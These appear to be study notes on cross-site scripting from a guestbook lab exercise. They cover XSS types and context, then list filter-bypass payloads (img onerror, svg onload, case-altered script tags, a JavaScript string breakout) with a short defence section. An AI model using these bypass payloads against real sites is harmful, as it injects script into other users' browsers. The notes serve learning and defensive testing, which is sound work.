# Cross-Site Scripting (XSS) – Practical Notes

##  What is XSS?

Cross-Site Scripting (XSS) is a vulnerability where an attacker injects malicious JavaScript into a web application, which then executes in another user’s browser.

---

##  Types of XSS

### 1. Reflected XSS

* Payload is reflected immediately in response
* No storage involved

### 2. Stored XSS

* Payload is stored in database
* Executes whenever page is loaded

### 3. DOM-based XSS

* Happens in browser (client-side)
* No server-side reflection needed

---

##  Core Concept (Most Important)

> XSS depends on **CONTEXT**, not just input

| Context        | Example                 | Executable? |
| -------------- | ----------------------- | ----------- |
| HTML text      | `<div>INPUT</div>`      | No          |
| HTML attribute | `<input value="INPUT">` | Maybe       |
| JavaScript     | `var x = "INPUT"`       | Yes         |
| HTML tag       | `<img onerror=...>`     | Yes         |

---

##  Case Study 

### Rendered Output:

```html
<div id="guestbook_comments">
Name: test<br />
Message: USER_INPUT<br />
</div>
```

### Observation:

* Input is inside `<div>` → plain text
* No tag / attribute / JS context

### Conclusion:

 XSS via message field is NOT possible

---

##  Why Message Field Failed

### Sanitization:

```php
$message = strip_tags(addslashes($message));
$message = mysqli_real_escape_string(...);
$message = htmlspecialchars($message);
```

### Effects:

* Removes HTML tags → no `<script>`, `<img>`
* Escapes quotes → prevents breaking context
* Encodes special chars → `< > " '`

Final output = plain text only

---

##  Failed Payload Example

Input:

```html
autofocus onfocus=alert(1)
```

Output:

```html
Message: autofocus onfocus=alert(1)
```

 No execution because:

* Not inside a tag
* No event handler context

---

##  Weak Point: Name Field

```php
$name = str_replace('<script>', '', $name);
$name = mysqli_real_escape_string(...);
```

### Problems:

* Only removes exact `<script>`
* Case-sensitive
* No output encoding

---

##  Working Payloads (Name Field)

### Basic:

```html
<img src=x onerror=alert(1)>
```

### SVG:

```html
<svg onload=alert(1)>
```

### Case bypass:

```html
<ScRiPt>alert(1)</ScRiPt>
```

### Filter bypass:

```html
<script >alert(1)</script>
```

---

##  Small Payloads (for length restriction)

```html
<svg/onload=alert(1)>
```

```html
<img src=x onerror=alert(1)>
```

---

##  JavaScript Context Exploit

If input is used like:

```html
<script>
var msg = "INPUT";
</script>
```

### Payload:

```js
"; alert(1); //
```

### Logic:

1. Close string → `"`
2. Inject code → `alert(1)`
3. Comment rest → `//`

---

##  Escaping with Backslash (addslashes)

Input:

```js
"; alert(1); //
```

Becomes:

```js
\"; alert(1); //
```

### Bypass:

```js
\\"); alert(1); //
```

---

##  Key Mistakes by Developers

 Using `strip_tags()` for security
Blacklist filtering (`<script>` only)
 Mixing SQL + XSS protection
 Not encoding output (`htmlspecialchars`)

---

##  Proper Defense

 Use prepared statements (SQL)
 Use `htmlspecialchars()` at output
 Context-aware escaping
Content Security Policy (CSP)



##  Final Takeaway

* XSS is not about payloads, it's about **context**
* If input is rendered as plain text →  no XSS
* Always target the **weakest input field**
* Filters ≠ security

---

##  Practice Strategy

1. Identify input point
2. Track where it is reflected
3. Determine context
4. Choose payload accordingly
5. Bypass filters


